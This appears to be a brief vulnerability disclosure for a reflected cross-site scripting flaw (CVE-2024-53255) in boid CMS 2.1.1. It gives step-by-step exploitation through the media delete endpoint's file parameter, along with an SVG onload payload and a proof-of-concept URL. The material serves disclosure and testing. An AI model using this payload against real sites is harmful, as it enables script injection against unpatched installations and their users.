# CVE-2024-53255
boid CMS 2.1.1 - reflected Cross-Site Scripting (XSS)

# Description:

A reflected XSS vulnerability exists in the /admin?page=media endpoint in the file parameter, allowing an attacker to inject arbitrary JavaScript code

# Steps to exploit:

1- Login to the CMS and Navigate to the delete page (/admin?page=media).

2- Select any file to delete and intercept the request using a proxy tool.

3- Modify the file parameter in the intercepted request to:

```
<svg+onload%3dalert(document.domain)>
```
4 - Forward the modified request and the injected script will execute.

Proof of concept (Poc):

```
http://localhost/boidcms/admin?page=media&action=delete&file=<svg+onload%3dalert(document.domain)>&token=693b471d9ee886766b69fd0dab9d992cd7f0e1e483822b28b6e8bcde0cf502e4
